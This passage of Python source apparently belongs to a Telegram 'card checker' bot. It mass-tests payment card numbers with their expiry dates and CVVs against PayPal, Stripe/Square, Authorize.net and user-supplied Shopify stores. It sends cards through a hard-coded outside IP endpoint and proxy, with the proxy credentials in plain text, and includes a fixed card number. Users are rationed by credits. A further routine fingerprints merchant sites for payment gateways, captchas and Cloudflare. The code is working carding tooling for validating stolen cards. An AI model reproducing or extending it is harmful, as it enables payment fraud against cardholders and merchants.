    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass VBV check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        gateway = "3DS Lookup"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_vbv_card(card)
                        results.append({
                            'card': card,
                            'status': result['status'],
                            'response': result['response'],
                            'gateway': result.get('gateway', '3DS Lookup')
                        })
                    except Exception as e:
                        results.append({
                            'card': card,
                            'status': 'ERROR',
                            'response': f'Error: {str(e)}',
                            'gateway': gateway
                        })

                    current_time = time.time() - start_time
                    progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_message.message_id,
                        text=progress_msg,
                        parse_mode='HTML'
                    )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass VBV check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /mpy command
@bot.message_handler(commands=['mpy'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mpy'))
def handle_mpy(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass PayPal check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        gateway = "Paypal [0.1$]"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_paypal_card(card)
                        results.append({
                            'card': card,
                            'status': result['status'],
                            'response': result['response'],
                            'gateway': result.get('gateway', 'Paypal [0.1$]')
                        })
                    except Exception as e:
                        results.append({
                            'card': card,
                            'status': 'ERROR',
                            'response': f'Error: {str(e)}',
                            'gateway': gateway
                        })

                    current_time = time.time() - start_time
                    progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_message.message_id,
                        text=progress_msg,
                        parse_mode='HTML'
                    )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass PayPal check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /mqq command
@bot.message_handler(commands=['mqq'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mqq'))
def handle_mqq(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass Stripe Square check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        gateway = "Stripe Square [0.20$]"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_qq_card(card)
                        results.append({
                            'card': card,
                            'status': result['status'],
                            'response': result['response'],
                            'gateway': result.get('gateway', 'Stripe Square [0.20$]')
                        })
                    except Exception as e:
                        results.append({
                            'card': card,
                            'status': 'ERROR',
                            'response': f'Error: {str(e)}',
                            'gateway': gateway
                        })

                    current_time = time.time() - start_time
                    progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_message.message_id,
                        text=progress_msg,
                        parse_mode='HTML'
                    )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass Stripe Square check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /mcc command
@bot.message_handler(commands=['mcc'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mcc'))
def handle_mcc(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass Site Based check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        gateway = "Site Based [1$]"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = process_cc_card(card)
                        results.append({
                            'card': card,
                            'status': result['status'],
                            'response': result['response'],
                            'gateway': result.get('gateway', 'Site Based [1$]')
                        })
                    except Exception as e:
                        results.append({
                            'card': card,
                            'status': 'ERROR',
                            'response': f'Error: {str(e)}',
                            'gateway': gateway
                        })

                    current_time = time.time() - start_time
                    progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_message.message_id,
                        text=progress_msg,
                        parse_mode='HTML'
                    )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass Site Based check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /at command
@bot.message_handler(commands=['at'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.at'))
def handle_at(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "Authnet [5$]", bin_info)
    import html
    status_message = bot.reply_to(message, safe_html(checking_msg), parse_mode='HTML')
    start_time = time.time()
    check_result = process_card_at(cc)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /mat command
@bot.message_handler(commands=['mat'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mat'))
def handle_mat(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass AT check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        try:
            first_card_result = process_card_at(cards[0])
            gateway = first_card_result.get("gateway", "Authnet [5$]")
        except:
            gateway = "Authnet [5$]"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                    future_to_card = {executor.submit(process_card_at, card): card for card in cards}
                    for i, future in enumerate(concurrent.futures.as_completed(future_to_card), 1):
                        card = future_to_card[future]
                        try:
                            result = future.result()
                            results.append({
                                'card': card,
                                'status': result['status'],
                                'response': result['response'],
                                'gateway': result.get('gateway', 'Authnet [5$]')
                            })
                        except Exception as e:
                            results.append({
                                'card': card,
                                'status': 'ERROR',
                                'response': f'Error: {str(e)}',
                                'gateway': gateway
                            })

                        current_time = time.time() - start_time
                        progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                        bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=status_message.message_id,
                            text=progress_msg,
                            parse_mode='HTML'
                        )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass AT check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")
import html

def safe_html(text: str) -> str:
    if not text:
        return ""
    return html.escape(str(text))


def test_shopify_site(url):
    """Test if a Shopify site is reachable and working with a test card"""
    try:
        # Use the fixed test card instead of generating random one
        test_card = "5547300001996183|11|2028|197"
        
        api_url = f"http://147.182.160.157/zod.php?cc={test_card}&site={url}&proxy=142.111.48.253:7030:anwlpudu:u4i8uupb4b5s"
        response = requests.get(api_url, timeout=30)

        if response.status_code != 200:
            return False, "Site not reachable", "0.0", "shopify_payments", "No response"
            
        response_text = response.text
        
        # Parse response
        price = "1.0"  # default
        gateway = "shopify_payments"  # default
        api_message = "No response"
        
        try:
            if '"Response":"' in response_text:
                api_message = response_text.split('"Response":"')[1].split('"')[0]
            if '"Price":"' in response_text:
                price = response_text.split('"Price":"')[1].split('"')[0]
            if '"Gateway":"' in response_text:
                gateway = response_text.split('"Gateway":"')[1].split('"')[0]
        except:
            pass
            
        return True, api_message, price, gateway, "Site is reachable and working"
        
    except Exception as e:
        return False, f"Error testing site: {str(e)}", "0.0", "shopify_payments", "Error"

@bot.message_handler(commands=['seturl'])
def handle_seturl(message):
    try:
        user_id = str(message.from_user.id)
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            bot.reply_to(message, "Usage: /seturl <your_shopify_site_url>")
            return
            
        url = parts[1].strip()
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        status_msg = bot.reply_to(
            message,
            f"🔄 Adding URL: <code>{safe_html(url)}</code>\nTesting reachability...",
            parse_mode='HTML'
        )
        
        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                raise ValueError("Invalid URL format")
        except Exception as e:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                text=f"❌ Invalid URL format: {safe_html(str(e))}"
            )
            return
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            text=f"🔄 Testing URL: <code>{safe_html(url)}</code>\nTesting with test card...",
            parse_mode='HTML'
        )
        
        is_valid, api_message, price, gateway, test_message = test_shopify_site(url)
        if not is_valid:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                text=f"❌ Failed to verify Shopify site:\n{safe_html(test_message)}\nPlease check your URL and try again."
            )
            return
        
        USER_SITES[user_id] = {
            'url': url,
            'price': price
        }
        save_user_sites()
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            text=f"""
┏━━━━━━━⍟
┃ 𝗦𝗶𝘁𝗲 𝗔𝗱𝗱𝗲𝗱 ✅
┗━━━━━━━━━━━⊛

❖ 𝗦𝗶𝘁𝗲 ➳ <code>{safe_html(url)}</code>
❖ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➳ {safe_html(api_message)}
❖ 𝗔𝗺𝗼𝘂𝗻𝘁 ➳ ${safe_html(price)}

<i>You can now check cards with /sh command</i>
─────── ⸙ ────────
""",
            parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"Error: {safe_html(str(e))}")


@bot.message_handler(commands=['rmurl'])
def handle_rmurl(message):
    try:
        user_id = str(message.from_user.id)
        
        if user_id not in USER_SITES:
            bot.reply_to(message, "You don't have any site to remove. Add a site with /seturl")
            return
            
        del USER_SITES[user_id]
        save_user_sites()
        bot.reply_to(message, "✅ Your Shopify site has been removed successfully.")
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['myurl'])
def handle_myurl(message):
    try:
        user_id = str(message.from_user.id)
        
        if user_id not in USER_SITES:
            bot.reply_to(message, "You haven't added any site yet. Add a site with /seturl <your_shopify_url>")
            return
            
        site_info = USER_SITES[user_id]
        bot.reply_to(message, f"""Your Shopify site details:

URL: <code>{site_info['url']}</code>
Default Amount: ${site_info.get('price', '1.0')}

Use /sh command to check cards""", parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

def check_shopify_cc(cc, site_info):
    try:
        # Normalize card input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        parts = [x.strip() for x in card.split('|') if x.strip()]
        
        if len(parts) < 4:
            return {
                'status': 'ERROR', 
                'card': cc, 
                'message': 'Invalid format',
                'brand': 'UNKNOWN', 
                'country': 'UNKNOWN 🇺🇳', 
                'type': 'UNKNOWN',
                'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
                'price': site_info.get('price', '1.0')
            }

        cc_num, mm, yy_raw, cvv = parts[:4]
        mm = mm.zfill(2)
        yy = yy_raw[2:] if yy_raw.startswith("20") and len(yy_raw) == 4 else yy_raw
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # Get BIN info
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🇺🇳'
        try:
            bin_data = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5).json()
            brand = bin_data.get('brand', 'UNKNOWN')
            country_name = bin_data.get('country_name', 'UNKNOWN')
            country_flag = bin_data.get('country_flag', '🇺🇳')
            card_type = bin_data.get('type', 'UNKNOWN')
            bank = bin_data.get('bank', 'UNKNOWN')
        except:
            pass

        # Make API request
        api_url = f"http://147.182.160.157/zod.php?cc={formatted_cc}&site={site_info['url']}&proxy=142.111.48.253:7030:anwlpudu:u4i8uupb4b5s"
        response = requests.get(api_url, timeout=30)
        
        if response.status_code != 200:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f'API Error: {response.status_code}',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
                'price': site_info.get('price', '1.0')
            }

        # Parse response text
        response_text = response.text
        
        # Default values
        api_message = 'No response'
        price = site_info.get('price', '1.0')
        gateway = 'shopify_payments'
        status = 'DECLINED'
        
        # Extract data from response text
        try:
            if '"Response":"' in response_text:
                api_message = response_text.split('"Response":"')[1].split('"')[0]
                
                # Process response according to new rules
                response_upper = api_message.upper()
                if 'THANK YOU' in response_upper:
                    bot_response = 'ORDER CONFIRM!'
                    status = 'APPROVED'
                elif '3DS' in response_upper:
                    bot_response = 'OTP_REQUIRED'
                    status = 'APPROVED_OTP'
                elif 'EXPIRED_CARD' in response_upper:
                    bot_response = 'EXPIRE_CARD'
                    status = 'EXPIRED'
                elif any(x in response_upper for x in ['INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_ZIP']):
                    bot_response = api_message
                    status = 'APPROVED_OTP'
                else:
                    bot_response = api_message
            else:
                bot_response = api_message
                
            if '"Price":"' in response_text:
                price = response_text.split('"Price":"')[1].split('"')[0]
            if '"Gateway":"' in response_text:
                gateway = response_text.split('"Gateway":"')[1].split('"')[0]
        except Exception as e:
            bot_response = f"Error parsing response: {str(e)}"
        
        return {
            'status': status,
            'card': formatted_cc,
            'message': bot_response,
            'brand': brand,
            'country': f"{country_name} {country_flag}",
            'type': card_type,
            'gateway': f"Self Shopify [${price}]",
            'price': price
        }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Exception: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🇺🇳',
            'type': 'UNKNOWN',
            'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
            'price': site_info.get('price', '1.0')
        }

def format_shopify_response(result, user_full_name, processing_time):
    user_id_str = str(result.get('user_id', ''))
    
    # Determine user status
    if user_id_str == "7098912960":
        user_status = "Owner"
    elif user_id_str in ADMIN_IDS:
        user_status = "Admin"
  
    else:
        user_status = "Free"

    response = f"""
┏━━━━━━━⍟
┃ {status_text[result['status']]} {status_emoji[result['status']]}
┗━━━━━━━━━━━⊛

[⸙] 𝗖𝗮𝗿𝗱
   ↳ <code>{result['card']}</code>
[⸙] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{result['gateway']}</i>  
[⸙] 𝐑𝐞𝐬𝗽𝗼𝗻𝘀𝗲 ⌁ <i>{result['message']}</i>
──────── ⸙ ─────────
[⸙] 𝐁𝐫𝐚𝐧𝐝 ⌁ {result['brand']}
[⸙] 𝐁𝐚𝐧𝐤 ⌁ {result['type']}
[⸙] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {result['country']}
──────── ⸙ ─────────
[⸙] 𝐑𝐞𝐪 𝐁𝐲 ⌁ {user_full_name}[{user_status}]
[⸙] 𝗧𝗶𝗺𝗲 ⌁ {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝
"""
    return response

@bot.message_handler(commands=['sh'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sh'))
def handle_sh(message):
    user_id = str(message.from_user.id)
    
    if user_id not in USER_SITES:
        bot.reply_to(message, "❌ You haven't added any site yet. Add a site with /seturl <your_shopify_url>\nUse /myurl to view your site details")
        return
    
    if not use_credits(int(user_id)):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    try:
        cc = None
        
        if (message.text.startswith('/sh') and len(message.text.split()) == 1) or \
           (message.text.startswith('.sh') and len(message.text.strip()) == 3):
            
            if message.reply_to_message:
                replied_text = message.reply_to_message.text
                cc_pattern = r'\b(?:\d[ -]*?){13,16}\b'
                matches = re.findall(cc_pattern, replied_text)
                if matches:
                    cc = matches[0].replace(' ', '').replace('-', '')
                    details_pattern = r'(\d+)[\|/](\d+)[\|/](\d+)[\|/](\d+)'
                    details_match = re.search(details_pattern, replied_text)
                    if details_match:
                        cc = f"{details_match.group(1)}|{details_match.group(2)}|{details_match.group(3)}|{details_match.group(4)}"
        else:
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /sh CC|MM|YYYY|CVV or .sh CC|MM|YYYY|CVV")
                return
            cc = parts[1]

        if not cc:
            bot.reply_to(message, "❌ No card found. Either provide CC details after command or reply to a message containing CC details.")
            return

        start_time = time.time()
        user_full_name = safe_html(message.from_user.first_name + (" " + message.from_user.last_name if message.from_user.last_name else ""))

        bin_number = cc.split('|')[0][:6]
        bin_info = get_bin_info(bin_number) or {}
        brand = safe_html(bin_info.get('brand', 'UNKNOWN'))
        card_type = safe_html(bin_info.get('type', 'UNKNOWN'))
        country = safe_html(bin_info.get('country', 'UNKNOWN'))
        country_flag = safe_html(bin_info.get('country_flag', '🇺🇳'))

        status_msg = bot.reply_to(
            message,
            f"""
┏━━━━━━━⍟
┃ ↯ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠
┗━━━━━━━━━━━⊛

[⸙] 𝗖𝗮𝗿𝗱 ⌁ <code>{safe_html(cc)}</code>
[⸙] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{safe_html(f"Self Shopify [${USER_SITES[user_id].get('price', '1.0')}]")}</i>
[⸙] 𝐑𝐞𝐬𝗽𝗼𝗻𝘀𝗲 ⌁ <i>Processing</i>
──────── ⸙ ─────────
[⸙] 𝐁𝐫𝐚𝐧𝐝 ⌁ {brand}
[⸙] 𝐓𝐲𝐩𝐞 ⌁ {card_type}
[⸙] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {country} {country_flag}
──────── ⸙ ─────────
""",
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_shopify_cc(cc, USER_SITES[user_id])
                result['user_id'] = message.from_user.id
                processing_time = time.time() - start_time
                response_text = format_shopify_response(result, user_full_name, processing_time)

                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=response_text,
                    parse_mode='HTML'
                )

            except Exception as e:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=f"❌ An error occurred: {safe_html(str(e))}"
                )

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {safe_html(str(e))}")


import html
import re

def safe_html(text: str) -> str:
    if not text:
        return ""
    # Escape everything first
    text = html.escape(text)

    # (Optional) allow only a few safe tags (<b>, <i>, <u>, <code>)
    # Replace escaped tags with real ones
    text = re.sub(r"&lt;b&gt;", "<b>", text)
    text = re.sub(r"&lt;/b&gt;", "</b>", text)
    text = re.sub(r"&lt;i&gt;", "<i>", text)
    text = re.sub(r"&lt;/i&gt;", "</i>", text)
    text = re.sub(r"&lt;u&gt;", "<u>", text)
    text = re.sub(r"&lt;/u&gt;", "</u>", text)
    text = re.sub(r"&lt;code&gt;", "<code>", text)
    text = re.sub(r"&lt;/code&gt;", "</code>", text)

    return text

# Handle /gate command
def check_gate_url(url):
    try:
        def normalize_url(url):
            url = url.strip()
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            return url

        def is_valid_url(url):
            try:
                url = normalize_url(url)
                regex = re.compile(
                    r'^(?:http|ftp)s?://'
                    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'
                    r'localhost|'
                    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'
                    r'\[?[A-F0-9]*:[A-Z0-9:]+\]?)'
                    r'(?::\d+)?'
                    r'(?:/?|[/?]\S+)$', re.IGNORECASE)
                return re.match(regex, url) is not None
            except:
                return False

        def find_payment_gateways(response_text):
            gateways = [
                "paypal", "stripe", "braintree", "square", "cybersource", "authorize.net", "2checkout",
                "adyen", "worldpay", "sagepay", "checkout.com", "shopify", "razorpay", "bolt", "paytm",
                "venmo", "pay.google.com", "revolut", "eway", "woocommerce", "upi", "apple.com", "payflow",
                "payeezy", "paddle", "payoneer", "recurly", "klarna", "paysafe", "webmoney", "payeer",
                "payu", "skrill", "affirm", "afterpay", "dwolla", "global payments", "moneris", "nmi",
                "payment cloud", "paysimple", "paytrace", "stax", "alipay", "bluepay", "paymentcloud",
                "clover", "zelle", "google pay", "cashapp", "wechat pay", "transferwise", "stripe connect",
                "mollie", "sezzle", "payza", "gocardless", "bitpay", "sureship", "conekta",
                "fatture in cloud", "payzaar", "securionpay", "paylike", "nexi", "forte", "worldline", "payu latam"
            ]
            return [g.capitalize() for g in gateways if g in response_text.lower()]

        def check_captcha(response_text):
            keywords = {
                'recaptcha': ['recaptcha', 'google recaptcha'],
                'image selection': ['click images', 'identify objects', 'select all'],
                'text-based': ['enter the characters', 'type the text', 'solve the puzzle'],
                'verification': ['prove you are not a robot', 'human verification', 'bot check'],
                'hcaptcha': [
                    'hcaptcha', 'verify you are human', 'select images', 'cloudflare challenge',
                    'anti-bot verification', 'hcaptcha.com', 'hcaptcha-widget'
                ]
            }
            detected = []
            for typ, keys in keywords.items():
                for key in keys:
                    if re.search(rf'\b{re.escape(key)}\b', response_text, re.IGNORECASE):
                        if typ not in detected:
                            detected.append(typ)
            if re.search(r'<iframe.*?src=".*?hcaptcha.*?".*?>', response_text, re.IGNORECASE):
                if 'hcaptcha' not in detected:
                    detected.append('hcaptcha')
            return detected if detected else ['No captcha detected']

        def detect_cloudflare(response):
            headers = response.headers
            if 'cf-ray' in headers or 'cloudflare' in headers.get('server', '').lower():
                return "Cloudflare"
            if '__cf_bm' in response.cookies or '__cfduid' in response.cookies:
                return "Cloudflare"
            if 'cf-chl' in response.text.lower() or 'cloudflare challenge' in response.text.lower():
                return "Cloudflare"
            return "None"

